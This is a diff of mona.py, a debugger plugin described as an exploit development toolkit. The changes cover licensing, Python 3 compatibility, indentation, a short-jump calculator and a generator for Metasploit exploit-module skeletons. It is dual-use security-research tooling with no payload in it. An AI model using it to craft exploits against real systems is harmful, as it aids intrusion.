@@ -1,8 +1,9 @@
+#!/usr/bin/env python2.7
 """
  
 U{Corelan<https://www.corelan.be>}
 
-Copyright (c) 2011-2017, Peter Van Eeckhoutte - Corelan GCV
+Copyright (c) 2011-2021, Peter Van Eeckhoutte - Corelan Consulting bv
 All rights reserved.
 
 Redistribution and use in source and binary forms, with or without
@@ -19,20 +20,20 @@ modification, are permitted provided that the following conditions are met:
 THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND
 ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-DISCLAIMED. IN NO EVENT SHALL PETER VAN EECKHOUTTE OR CORELAN GCV BE LIABLE FOR ANY
-DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
-(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;
-LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
-ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
-(INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
-SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+DISCLAIMED. IN NO EVENT SHALL PETER VAN EECKHOUTTE OR CORELAN CONSULTING BV 
+BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, 
+OR CONSEQUENTIAL DAMAGES(INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE 
+GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) 
+HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, 
+STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY 
+WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
  
-$Revision: 577 $
-$Id: mona.py 577 2017-07-02 15:18:00Z corelanc0d3r $ 
+$Revision: 616 $
+$Id: mona.py 615 2021-09-04 08:29:00Z corelanc0d3r $ 
 """
 
 __VERSION__ = '2.0'
-__REV__ = filter(str.isdigit, '$Revision: 577 $')
+__REV__ = filter(str.isdigit, '$Revision: 616 $')
 __IMM__ = '1.8'
 __DEBUGGERAPP__ = ''
 arch = 32
@@ -43,35 +44,28 @@ win7mode = False
 # except:
 #   pass
 try:
-    import immlib as dbglib
-    from immlib import LogBpHook
-    __DEBUGGERAPP__ = "Immunity Debugger"
-except:     
-    try:
-        import pykd
-        import windbglib as dbglib
-        from windbglib import LogBpHook
-        dbglib.checkVersion()
-        arch = dbglib.getArchitecture()
-        __DEBUGGERAPP__ = "WinDBG"
-    except SystemExit, e:
-        print "-Exit."
-        import sys
-        sys.exit(e)
-    except Exception:
-        try: 
-            import pykd
-            import x64dbgpylib as dbglib
-            from x64dbgpylib import LogBpHook
-            dbglib.checkVersion()
-            arch = dbglib.getArchitecture()
-            __DEBUGGERAPP__ = "x64dbg"
-        #import traceback
-        except Exception:
-            print "Do not run this script outside of a debugger !"
-            #print traceback.format_exc()
-            import sys
-            exit(1)
+	import immlib as dbglib
+	from immlib import LogBpHook
+	__DEBUGGERAPP__ = "Immunity Debugger"
+except:		
+	try:
+		import pykd
+		import windbglib as dbglib
+		from windbglib import LogBpHook
+		dbglib.checkVersion()
+		arch = dbglib.getArchitecture()
+		__DEBUGGERAPP__ = "WinDBG"
+	except SystemExit:
+		print("-Exit.")
+		import sys
+		sys.exit(1)
+	except Exception:
+		#import traceback
+		print("Do not run this script outside of a debugger !")
+		#print traceback.format_exc()
+		import sys
+		sys.exit(1)
+
 import getopt
 
 try:
@@ -108,7 +102,7 @@ import pstats
 
 import copy
 
-DESC = "Corelan Team exploit development swiss army knife"
+DESC = "Corelan Consulting bv exploit development swiss army knife"
 
 #---------------------------------------#
 #  Global stuff                         #
@@ -122,6 +116,7 @@ global vtableCache
 global stacklistCache
 global segmentlistCache
 global VACache
+global IATCache
 global NtGlobalFlag
 global FreeListBitmap
 global memProtConstants
@@ -129,11 +124,13 @@ global currentArgs
 global disasmUpperChecked
 global disasmIsUpper
 global configFileCache
+global configwarningshown
 
 NtGlobalFlag = -1
 FreeListBitmap = {}
 memProtConstants = {}
 CritCache={}
+IATCache={}
 vtableCache={}
 stacklistCache={}
 segmentlistCache={}
@@ -147,6 +144,7 @@ noheader = False
 dbg = dbglib.Debugger()
 disasmUpperChecked = False
 disasmIsUpper = False
+configwarningshown = False
 
 if __DEBUGGERAPP__ == "WinDBG":
     if pykd.getSymbolPath().replace(" ","") == "":
@@ -242,6 +240,13 @@ def resetGlobals():
     disasmUpperChecked = False
 
     return
+
+
+def getPythonVersion():
+	versioninfo = sys.version
+	versioninfolines = versioninfo.split('\n')
+	return versioninfolines[0]
+
 
 def toHex(n):
     """
@@ -431,6 +436,23 @@ def getIntForPart(part):
     return partval,addyok
 
 
+def getHeapAllocSize(requested_size, granularity = 8):
+	"""
+	Returns the expected allocated size for a request of X bytes of heap memory
+	taking a certain granularity into account
+	"""
+	
+	requested_size_int = to_int(requested_size)
+	interimval = (requested_size_int / granularity) * granularity
+	interimtimes = (requested_size_int / granularity)
+	if (interimval < requested_size_int):
+		interimtimes += 1
+	allocated_size = granularity * interimtimes
+	
+	return allocated_size
+	
+
+
 def getFunctionAddress(modname,funcname):
     """
     Returns the addres of the function inside a given module
@@ -543,18 +565,18 @@ def stripExtension(fullname):
     Arguments :
     fullname - the original string
 
-    Return:
-    A string, containing the original string without the last extension
-    """
-    nameparts = fullname.split(".")
-    if len(nameparts) > 1:
-        cnt = 0
-        modname = ""
-        while cnt < len(nameparts)-1:
-            modname = modname + nameparts[cnt] + "."
-            cnt += 1
-        return modname.strip(".")
-    return fullname
+	Return:
+	A string, containing the original string without the last extension
+	"""
+	nameparts = str(fullname).split(".")
+	if len(nameparts) > 1:
+		cnt = 0
+		modname = ""
+		while cnt < len(nameparts)-1:
+			modname = modname + nameparts[cnt] + "."
+			cnt += 1
+		return modname.strip(".")
+	return fullname
 
 
 def toHexByte(n):
@@ -610,45 +632,54 @@ def hex2bin(pattern):
     
     return ''.join([binascii.a2b_hex(i+j) for i,j in zip(pattern[0::2],pattern[1::2])])
 
-def getVariantType(typenr):
+def cleanHex(hex):
+	hex = hex.replace("'","")
+	hex = hex.replace('"',"")
+	hex = hex.replace("\\x","")
+	hex = hex.replace("0x","")
+	return hex
 
-    varianttypes = {}
-    varianttypes[0x0] = "VT_EMPTY"
-    varianttypes[0x1] = "VT_NULL"
-    varianttypes[0x2] = "VT_I2"
-    varianttypes[0x3] = "VT_I4"
-    varianttypes[0x4] = "VT_R4"
-    varianttypes[0x5] = "VT_R8"
-    varianttypes[0x6] = "VT_CY"
-    varianttypes[0x7] = "VT_DATE"
-    varianttypes[0x8] = "VT_BSTR"
-    varianttypes[0x9] = "VT_DISPATCH"
-    varianttypes[0xA] = "VT_ERROR"
-    varianttypes[0xB] = "VT_BOOL"
-    varianttypes[0xC] = "VT_VARIANT"
-    varianttypes[0xD] = "VT_UNKNOWN"
-    varianttypes[0xE] = "VT_DECIMAL"
-    varianttypes[0x10] = "VT_I1"
-    varianttypes[0x11] = "VT_UI1"
-    varianttypes[0x12] = "VT_UI2"
-    varianttypes[0x13] = "VT_UI4"
-    varianttypes[0x14] = "VT_I8"
-    varianttypes[0x15] = "VT_UI8"
-    varianttypes[0x16] = "VT_INT"
-    varianttypes[0x17] = "VT_UINT"
-    varianttypes[0x18] = "VT_VOID"
-    varianttypes[0x19] = "VT_HRESULT"
-    varianttypes[0x1A] = "VT_PTR"
-    varianttypes[0x1B] = "VT_SAFEARRAY"
-    varianttypes[0x1C] = "VT_CARRAY"
-    varianttypes[0x1D] = "VT_USERDEFINED"
-    varianttypes[0x1E] = "VT_LPSTR"
-    varianttypes[0x1F] = "VT_LPWSTR"
-    varianttypes[0x24] = "VT_RECORD"
-    varianttypes[0x25] = "VT_INT_PTR"
-    varianttypes[0x26] = "VT_UINT_PTR"
-    varianttypes[0x2000] = "VT_ARRAY"
-    varianttypes[0x4000] = "VT_BYREF"
+def hex2int(hex):
+	return int(hex,16)
+
+def getVariantType(typenr):
+	varianttypes = {}
+	varianttypes[0x0] = "VT_EMPTY"
+	varianttypes[0x1] = "VT_NULL"
+	varianttypes[0x2] = "VT_I2"
+	varianttypes[0x3] = "VT_I4"
+	varianttypes[0x4] = "VT_R4"
+	varianttypes[0x5] = "VT_R8"
+	varianttypes[0x6] = "VT_CY"
+	varianttypes[0x7] = "VT_DATE"
+	varianttypes[0x8] = "VT_BSTR"
+	varianttypes[0x9] = "VT_DISPATCH"
+	varianttypes[0xA] = "VT_ERROR"
+	varianttypes[0xB] = "VT_BOOL"
+	varianttypes[0xC] = "VT_VARIANT"
+	varianttypes[0xD] = "VT_UNKNOWN"
+	varianttypes[0xE] = "VT_DECIMAL"
+	varianttypes[0x10] = "VT_I1"
+	varianttypes[0x11] = "VT_UI1"
+	varianttypes[0x12] = "VT_UI2"
+	varianttypes[0x13] = "VT_UI4"
+	varianttypes[0x14] = "VT_I8"
+	varianttypes[0x15] = "VT_UI8"
+	varianttypes[0x16] = "VT_INT"
+	varianttypes[0x17] = "VT_UINT"
+	varianttypes[0x18] = "VT_VOID"
+	varianttypes[0x19] = "VT_HRESULT"
+	varianttypes[0x1A] = "VT_PTR"
+	varianttypes[0x1B] = "VT_SAFEARRAY"
+	varianttypes[0x1C] = "VT_CARRAY"
+	varianttypes[0x1D] = "VT_USERDEFINED"
+	varianttypes[0x1E] = "VT_LPSTR"
+	varianttypes[0x1F] = "VT_LPWSTR"
+	varianttypes[0x24] = "VT_RECORD"
+	varianttypes[0x25] = "VT_INT_PTR"
+	varianttypes[0x26] = "VT_UINT_PTR"
+	varianttypes[0x2000] = "VT_ARRAY"
+	varianttypes[0x4000] = "VT_BYREF"
 
     if typenr in varianttypes:
         return varianttypes[typenr]
@@ -807,33 +838,40 @@ def getVersionInfo(filename):
 
     
 def toniceHex(data,size):
-    """
-    Converts a series of bytes into a hex string, 
-    newline after 'size' nr of bytes
-    
-    Arguments :
-    data - the bytes to convert
-    size - the number of bytes to show per linecache
-    
-    Return :
-    a multiline string
-    """
-    flip = 1
-    thisline = "\""
-    block = ""
-    
-    for cnt in xrange(len(data)):
-        thisline += "\\x%s" % toHexByte(ord(data[cnt]))             
-        if (flip == size) or (cnt == len(data)-1):              
-            thisline += "\""
-            flip = 0
-            block += thisline 
-            block += "\n"
-            thisline = "\""
-        cnt += 1
-        flip += 1
-    return block.lower()
-    
+	"""
+	Converts a series of bytes into a hex string, 
+	newline after 'size' nr of bytes
+	
+	Arguments :
+	data - the bytes to convert
+	size - the number of bytes to show per linecache
+	
+	Return :
+	a multiline string
+	"""
+	flip = 1
+	thisline = "\""
+	block = ""
+
+	try:
+   		 # Python 2
+		xrange
+	except NameError:
+		# Python 3, xrange is now named range
+		xrange = range
+	
+	for cnt in xrange(len(data)):
+		thisline += "\\x%s" % toHexByte(ord(data[cnt]))				
+		if (flip == size) or (cnt == len(data)-1):				
+			thisline += "\""
+			flip = 0
+			block += thisline 
+			block += "\n"
+			thisline = "\""
+		cnt += 1
+		flip += 1
+	return block.lower()
+	
 def hexStrToInt(inputstr):
     """
     Converts a string with hex bytes to a numeric value
@@ -1729,70 +1767,83 @@ def getSkeletonHeader(exploittype,portnr,extension,url,badchars='\x00\x0a\x0d'):
     if thisauthor == "":
         thisauthor = "<insert your name here>"
 
-    skeletonheader = "##\n"
-    skeletonheader += "# This module requires Metasploit: http://metasploit.com/download\n"
-    skeletonheader += "# Current source: https://github.com/rapid7/metasploit-framework\n"
-    skeletonheader += "##\n\n"
-    skeletonheader += "require 'msf/core'\n\n"
-    skeletonheader += "class MetasploitModule < Msf::Exploit::Remote\n"
-    skeletonheader += "  #Rank definition: http://dev.metasploit.com/redmine/projects/framework/wiki/Exploit_Ranking\n"
-    skeletonheader += "  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking\n"
-    skeletonheader += "  Rank = NormalRanking\n\n"
-    
-    if exploittype == "fileformat":
-        skeletonheader += "  include Msf::Exploit::FILEFORMAT\n"
-    if exploittype == "network client (tcp)":
-        skeletonheader += "  include Msf::Exploit::Remote::Tcp\n"
-    if exploittype == "network client (udp)":
-        skeletonheader += "  include Msf::Exploit::Remote::Udp\n"
-        
-    if cve.strip() == "":
-        cve = "<insert CVE number here>"
-        
-    skeletoninit = "  def initialize(info = {})\n"
-    skeletoninit += "    super(update_info(info,\n"
-    skeletoninit += "      'Name'    => '" + name + "',\n"
-    skeletoninit += "      'Description'  => %q{\n"
-    skeletoninit += "          Provide information about the vulnerability / explain as good as you can\n"
-    skeletoninit += "          Make sure to keep each line less than 100 columns wide\n"
-    skeletoninit += "      },\n"
-    skeletoninit += "      'License'    => MSF_LICENSE,\n"
-    skeletoninit += "      'Author'    =>\n"
-    skeletoninit += "        [\n"
-    skeletoninit += "          '" + originalauthor + "<user[at]domain.com>',  # Original discovery\n"
-    skeletoninit += "          '" + thisauthor + "',  # MSF Module\n"       
-    skeletoninit += "        ],\n"
-    skeletoninit += "      'References'  =>\n"
-    skeletoninit += "        [\n"
-    skeletoninit += "          [ 'OSVDB', '<insert OSVDB number here>' ],\n"
-    skeletoninit += "          [ 'CVE', '" + cve + "' ],\n"
-    skeletoninit += "          [ 'URL', '" + url + "' ]\n"
-    skeletoninit += "        ],\n"
-    skeletoninit += "      'DefaultOptions' =>\n"
-    skeletoninit += "        {\n"
-    skeletoninit += "          'ExitFunction' => 'process', #none/process/thread/seh\n"
-    skeletoninit += "          #'InitialAutoRunScript' => 'migrate -f',\n"  
-    skeletoninit += "        },\n"
-    skeletoninit += "      'Platform'  => 'win',\n"
-    skeletoninit += "      'Payload'  =>\n"
-    skeletoninit += "        {\n"
-    skeletoninit += "          'BadChars' => \"" + bin2hexstr(badchars) + "\", # <change if needed>\n"
-    skeletoninit += "          'DisableNops' => true,\n"
-    skeletoninit += "        },\n"
-    
-    skeletoninit2 = "      'Privileged'  => false,\n"
-    skeletoninit2 += "      #Correct Date Format: \"M D Y\"\n"
-    skeletoninit2 += "      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec\n"
-    skeletoninit2 += "      'DisclosureDate'  => 'MONTH DAY YEAR',\n"
-    skeletoninit2 += "      'DefaultTarget'  => 0))\n"
-    
-    if exploittype.find("network") > -1:
-        skeletoninit2 += "\n    register_options([Opt::RPORT(" + str(portnr) + ")], self.class)\n"
-    if exploittype.find("fileformat") > -1:
-        skeletoninit2 += "\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf" + extension + "']),], self.class)\n"
-    skeletoninit2 += "\n  end\n\n"
-    
-    return skeletonheader,skeletoninit,skeletoninit2
+	skeletonheader = "##\n"
+	skeletonheader += "# This module requires Metasploit: http://metasploit.com/download\n"
+	skeletonheader += "# Current source: https://github.com/rapid7/metasploit-framework\n"
+	skeletonheader += "##\n\n"
+	skeletonheader += "require 'msf/core'\n\n"
+	skeletonheader += "class MetasploitModule < Msf::Exploit::Remote\n"
+	skeletonheader += "  #Rank definition: https://github.com/rapid7/metasploit-framework/wiki/Exploit-Ranking\n"
+	skeletonheader += "  #ManualRanking/LowRanking/AverageRanking/NormalRanking/GoodRanking/GreatRanking/ExcellentRanking\n"
+	skeletonheader += "  Rank = NormalRanking\n\n"
+	
+	if exploittype == "fileformat":
+		skeletonheader += "  include Msf::Exploit::FILEFORMAT\n"
+	if exploittype == "network client (tcp)":
+		skeletonheader += "  include Msf::Exploit::Remote::Tcp\n"
+	if exploittype == "network client (udp)":
+		skeletonheader += "  include Msf::Exploit::Remote::Udp\n"
+		
+	if cve.strip() == "":
+		cve = "<insert CVE number here>"
+		
+	skeletoninit = "  def initialize(info = {})\n"
+	skeletoninit += "    super(update_info(info,\n"
+	skeletoninit += "      'Name'    => '" + name + "',\n"
+	skeletoninit += "      'Description'  => %q{\n"
+	skeletoninit += "          Provide information about the vulnerability / explain as good as you can\n"
+	skeletoninit += "          Make sure to keep each line less than 100 columns wide\n"
+	skeletoninit += "      },\n"
+	skeletoninit += "      'License'    => MSF_LICENSE,\n"
+	skeletoninit += "      'Author'    =>\n"
+	skeletoninit += "        [\n"
+	skeletoninit += "          '" + originalauthor + "<user[at]domain.com>',  # Original discovery\n"
+	skeletoninit += "          '" + thisauthor + "',  # MSF Module\n"		
+	skeletoninit += "        ],\n"
+	skeletoninit += "      'References'  =>\n"
+	skeletoninit += "        [\n"
+	skeletoninit += "          [ 'OSVDB', '<insert OSVDB number here>' ],\n"
+	skeletoninit += "          [ 'CVE', '" + cve + "' ],\n"
+	skeletoninit += "          [ 'URL', '" + url + "' ]\n"
+	skeletoninit += "        ],\n"
+	skeletoninit += "      'DefaultOptions' =>\n"
+	skeletoninit += "        {\n"
+	skeletoninit += "          'ExitFunction' => 'process', #none/process/thread/seh\n"
+	skeletoninit += "          #'InitialAutoRunScript' => 'migrate -f',\n"	
+	skeletoninit += "        },\n"
+	skeletoninit += "      'Platform'  => 'win',\n"
+	skeletoninit += "      'Payload'  =>\n"
+	skeletoninit += "        {\n"
+	skeletoninit += "          'BadChars' => \"" + bin2hexstr(badchars) + "\", # <change if needed>\n"
+	skeletoninit += "          'DisableNops' => true,\n"
+	skeletoninit += "        },\n"
+	
+	skeletoninit2 = "      'Privileged'  => false,\n"
+	skeletoninit2 += "      #Correct Date Format: \"M D Y\"\n"
+	skeletoninit2 += "      #Month format: Jan,Feb,Mar,Apr,May,Jun,Jul,Aug,Sep,Oct,Nov,Dec\n"
+	skeletoninit2 += "      'DisclosureDate'  => 'MONTH DAY YEAR',\n"
+	skeletoninit2 += "      'DefaultTarget'  => 0))\n"
+	
+	if exploittype.find("network") > -1:
+		skeletoninit2 += "\n    register_options([Opt::RPORT(" + str(portnr) + ")], self.class)\n"
+	if exploittype.find("fileformat") > -1:
+		skeletoninit2 += "\n    register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf" + extension + "']),], self.class)\n"
+	skeletoninit2 += "\n  end\n\n"
+	
+	return skeletonheader,skeletoninit,skeletoninit2
+
+def shortJump(sizeofinst, offset):
+	"""
+	Calculate the parameter for a short relative jump from the size of instruction (which can be JMP, JNZ etc...) and the desired offset
+	Arguments:
+	sizeofinst - the size of the instruction used to achieve the jump
+	offset - the desired offset from the address of the instruction
+	Return:
+	A binary value which can be used along with the jump instruction
+	"""
+	if (offset - sizeofinst) < -128 or (offset - sizeofinst) > 127:
+		dbg.log(" ** short jump too long",highlight=1)
+	return struct.pack("b", offset - sizeofinst)
 
 def archValue(x86, x64):
     if arch == 32:
@@ -2304,25 +2355,28 @@ class MnDeferredHook(LogBpHook):
 #   Class to access config file         #
 #---------------------------------------#
 class MnConfig:
-    """
-    Class to perform config file operations
-    """
-    def __init__(self):
-    
-        self.configfile = "mona.ini"
-        self.currpath = os.path.dirname(os.path.realpath(self.configfile))
-        # first check if we will be saving the file into Immunity folder
-        if __DEBUGGERAPP__ == "Immunity Debugger":
-            if not os.path.exists(os.path.join(self.currpath,"immunitydebugger.exe")):
-                dbg.log(" ** Warning: using mona.ini file from %s" % self.currpath)
-    
-    def get(self,parameter):
-        """
-        Retrieves the contents of a given parameter from the config file
-        or from memory if the config file has been read already
-        (configFileCache)
-        Arguments:
-        parameter - the name of the parameter 
+	"""
+	Class to perform config file operations
+	"""
+	def __init__(self):
+	
+		global configwarningshown
+		self.configfile = "mona.ini"
+		self.currpath = os.path.dirname(os.path.realpath(self.configfile))
+		# first check if we will be saving the file into Immunity folder
+		if __DEBUGGERAPP__ == "Immunity Debugger":
+			if not os.path.exists(os.path.join(self.currpath,"immunitydebugger.exe")):
+				if not configwarningshown:
+					dbg.log(" ** Warning: using mona.ini file from %s" % self.currpath, highlight=True)
+					configwarningshown = True
+	
+	def get(self,parameter):
+		"""
+		Retrieves the contents of a given parameter from the config file
+		or from memory if the config file has been read already
+		(configFileCache)
+		Arguments:
+		parameter - the name of the parameter 
 
         Return:
         A string, containing the contents of that parameter
@@ -2369,58 +2423,58 @@ class MnConfig:
         parameter - the name of the parameter 
         paramvalue - the new value of the parameter
 
-        Return:
-        nothing
-        """
-        global configFileCache
-        configFileCache[parameter.strip().lower()] = paramvalue
-        if os.path.exists(self.configfile):
-            #modify file
-            try:
-                configfileobj = open(self.configfile,"r")
-                content = configfileobj.readlines()
-                configfileobj.close()
-                newcontent = []
-                paramfound = False
-                for thisLine in content:
-                    thisLine = thisLine.replace('\n','').replace('\r','')
-                    if not thisLine[0] == "#":
-                        currparam = thisLine.split('=')
-                        if currparam[0].strip().lower() == parameter.strip().lower():
-                            newcontent.append(parameter+"="+paramvalue+"\n")
-                            paramfound = True
-                        else:
-                            newcontent.append(thisLine+"\n")
-                    else:
-                        newcontent.append(thisLine+"\n")
-                if not paramfound:
-                    newcontent.append(parameter+"="+paramvalue+"\n")
-                #save new config file (rewrite)
-                dbg.log("[+] Saving config file, modified parameter %s" % parameter)
-                FILE=open(self.configfile,"w")
-                FILE.writelines(newcontent)
-                FILE.close()
-                dbg.log("     mona.ini saved under %s" % self.currpath)
-            except:
-                dbg.log("Error writing config file : %s : %s" % (sys.exc_type,sys.exc_value),highlight=1)
-                return ""
-        else:
-            #create new file
-            try:
-                dbg.log("[+] Creating config file, setting parameter %s" % parameter)
-                FILE=open(self.configfile,"w")
-                FILE.write("# -----------------------------------------------#\n")
-                FILE.write("# !mona.py configuration file                    #\n")
-                FILE.write("# Corelan Team - https://www.corelan.be          #\n") 
-                FILE.write("# -----------------------------------------------#\n")
-                FILE.write(parameter+"="+paramvalue+"\n")
-                FILE.close()
-            except:
-                dbg.log(" ** Error writing config file", highlight=1)
-                return ""
-        return ""
-    
-    
+		Return:
+		nothing
+		"""
+		global configFileCache
+		configFileCache[parameter.strip().lower()] = paramvalue
+		if os.path.exists(self.configfile):
+			#modify file
+			try:
+				configfileobj = open(self.configfile,"r")
+				content = configfileobj.readlines()
+				configfileobj.close()
+				newcontent = []
+				paramfound = False
+				for thisLine in content:
+					thisLine = thisLine.replace('\n','').replace('\r','')
+					if not thisLine[0] == "#":
+						currparam = thisLine.split('=')
+						if currparam[0].strip().lower() == parameter.strip().lower():
+							newcontent.append(parameter+"="+paramvalue+"\n")
+							paramfound = True
+						else:
+							newcontent.append(thisLine+"\n")
+					else:
+						newcontent.append(thisLine+"\n")
+				if not paramfound:
+					newcontent.append(parameter+"="+paramvalue+"\n")
+				#save new config file (rewrite)
+				dbg.log("[+] Saving config file, modified parameter %s" % parameter)
+				FILE=open(self.configfile,"w")
+				FILE.writelines(newcontent)
+				FILE.close()
+				dbg.log("     mona.ini saved under %s" % self.currpath)
+			except:
+				dbg.log("Error writing config file : %s : %s" % (sys.exc_type,sys.exc_value),highlight=1)
+				return ""
+		else:
+			#create new file
+			try:
+				dbg.log("[+] Creating config file, setting parameter %s" % parameter)
+				FILE=open(self.configfile,"w")
+				FILE.write("# -----------------------------------------------#\n")
+				FILE.write("# mona.py configuration file                    #\n")
+				FILE.write("# Corelan Consulting bv - https://www.corelan.be          #\n") 
+				FILE.write("# -----------------------------------------------#\n")
+				FILE.write(parameter+"="+paramvalue+"\n")
+				FILE.close()
+			except:
+				dbg.log(" ** Error writing config file", highlight=1)
+				return ""
+		return ""
+	
+	
 #---------------------------------------#
 #   Class to log entries to file        #
 #---------------------------------------#
@@ -2442,98 +2496,89 @@ class MnLog:
         used to retrieve the full path to the logfile name of the current MnLog class object
         Logfiles are written to the debugger program folder, unless a config value 'workingfolder' is set.
 
-        Return:
-        full path to the logfile name.
-        """ 
-        global noheader
-        if clear:
-            if not silent:
-                dbg.log("[+] Preparing output file '" + self.filename +"'")
-        if not showheader:
-            noheader = True
-        debuggedname = dbg.getDebuggedName()
-        thispid = dbg.getDebuggedPid()
-        if thispid == 0:
-            debuggedname = "_no_name_"
-        thisconfig = MnConfig()
-        workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
-        #strip extension from debuggedname
-        parts = debuggedname.split(".")
-        extlen = len(parts[len(parts)-1])+1
-        debuggedname = debuggedname[0:len(debuggedname)-extlen]
-        debuggedname = debuggedname.replace(" ","_")
-        workingfolder = workingfolder.replace('%p', debuggedname)
-        workingfolder = workingfolder.replace('%i', str(thispid))       
-        logfile = workingfolder + "\\" + self.filename
-        #does working folder exist ?
-        if workingfolder != "":
-            if not os.path.exists(workingfolder):
-                try:
-                    dbg.log("    - Creating working folder %s" % workingfolder)
-                    #recursively create folders
-                    os.makedirs(workingfolder)
-                    dbg.log("    - Folder created")
-                except:
-                    dbg.log("   ** Unable to create working folder %s, the debugger program folder will be used instead" % workingfolder,highlight=1)
-                    logfile = self.filename
-        else:
-            logfile = self.filename
-        if clear:
-            if not silent:
-                dbg.log("    - (Re)setting logfile %s" % logfile)
-            try:
-                if os.path.exists(logfile):
-                    try:
-                        os.delete(logfile+".old")
-                    except:
-                        pass
-                    try:
-                        os.rename(logfile,logfile+".old")
-                    except:
-                        try:
-                            os.rename(logfile,logfile+".old2")
-                        except:
-                            pass
-            except:
-                pass
-            #write header
-            if not noheader:
-                try:
-                    with open(logfile,"w") as fh:
-                        fh.write("=" * 80 + '\n')
-                        thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
-                        thisversion = thisversion.replace("'","")
-                        fh.write("  Output generated by mona.py v"+thisversion+", rev "+thisrevision+" - " + __DEBUGGERAPP__ + "\n")
-                        fh.write("  Corelan Team - https://www.corelan.be\n")
-                        fh.write("=" * 80 + '\n')
-                        osver=dbg.getOsVersion()
-                        osrel=dbg.getOsRelease()
-                        fh.write("  OS : " + osver + ", release " + osrel + "\n")
-                        fh.write("  Process being debugged : " + debuggedname +" (pid " + str(thispid) + ")\n")
-                        currmonaargs = " ".join(x for x in currentArgs)
-                        fh.write("  Current mona arguments: %s\n" % currmonaargs)
-                        fh.write("=" * 80 + '\n')
-                        fh.write("  " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
-                        fh.write("=" * 80 + '\n')
-                except:
-                    pass
-            else:
-                try:
-                    with open(logfile,"w") as fh:
-                        fh.write("")
-                except:
-                    pass
-            #write module table
-            try:
-                if not ignoremodules:
-                    showModuleTable(logfile)
-            except:
-                pass
-        return logfile
-        
-    def write(self,entry,logfile):
-        """
-        Write an entry (can be multiline) to a given logfile
+		Return:
+		full path to the logfile name.
+		"""	
+		global noheader
+		if clear:
+			if not silent:
+				dbg.log("[+] Preparing output file '" + self.filename +"'")
+		if not showheader:
+			noheader = True
+		debuggedname = dbg.getDebuggedName()
+		thispid = dbg.getDebuggedPid()
+		if thispid == 0:
+			debuggedname = "_no_name_"
+		
+		thisconfig = MnConfig()
+		workingfolder = thisconfig.get("workingfolder").rstrip("\\").strip()
+		#strip extension from debuggedname
+		parts = debuggedname.split(".")
+		extlen = len(parts[len(parts)-1])+1
+		debuggedname = debuggedname[0:len(debuggedname)-extlen]
+		debuggedname = debuggedname.replace(" ","_")
+		workingfolder = workingfolder.replace('%p', debuggedname)
+		workingfolder = workingfolder.replace('%i', str(thispid))		
+		#logfile = workingfolder + "\\" + self.filename
+		# working folder will be created inside getAbsolutePath if needed
+		logfile = getAbsolutePath(self.filename)
+
+		if clear:
+			if not silent:
+				dbg.log("    - (Re)setting logfile %s" % logfile)
+			try:
+				if os.path.exists(logfile):
+					try:
+						os.delete(logfile+".old")
+					except:
+						pass
+					try:
+						os.rename(logfile,logfile+".old")
+					except:
+						try:
+							os.rename(logfile,logfile+".old2")
+						except:
+							pass
+			except:
+				pass
+			#write header
+			if not noheader:
+				try:
+					with open(logfile,"w") as fh:
+						fh.write("=" * 80 + '\n')
+						thisversion,thisrevision = getVersionInfo(inspect.stack()[0][1])
+						thisversion = thisversion.replace("'","")
+						fh.write("  Output generated by mona.py v"+thisversion+", rev "+thisrevision+" - " + __DEBUGGERAPP__ + "\n")
+						fh.write("  Corelan Consulting bv - https://www.corelan.be\n")
+						fh.write("=" * 80 + '\n')
+						osver=dbg.getOsVersion()
+						osrel=dbg.getOsRelease()
+						fh.write("  OS : " + osver + ", release " + osrel + "\n")
+						fh.write("  Process being debugged : " + debuggedname +" (pid " + str(thispid) + ")\n")
+						currmonaargs = " ".join(x for x in currentArgs)
+						fh.write("  Current mona arguments: %s\n" % currmonaargs)
+						fh.write("=" * 80 + '\n')
+						fh.write("  " + datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + "\n")
+						fh.write("=" * 80 + '\n')
+				except:
+					pass
+			else:
+				try:
+					with open(logfile,"w") as fh:
+						fh.write("")
+				except:
+					pass
+			#write module table
+			try:
+				if not ignoremodules:
+					showModuleTable(logfile)
+			except:
+				pass
+		return logfile
+		
+	def write(self,entry,logfile):
+		"""
+		Write an entry (can be multiline) to a given logfile
 
         Arguments:
         entry - the data to write to the logfile
@@ -2615,126 +2660,126 @@ class MnQueue:
 #---------------------------------------#
     
 class MnModule:
-    """
-    Class to access module properties
-    """
-    def __init__(self, modulename):
-        #dbg.log("MnModule(%s)" % modulename)
-        modisaslr = True
-        modissafeseh = True
-        modrebased = True
-        modisnx = True
-        modisos = True
-        self.IAT = {}
-        self.EAT = {}
-        path = ""
-        mzbase = 0
-        mzsize = 0
-        mztop = 0
-        mcodebase = 0
-        mcodesize = 0
-        mcodetop = 0
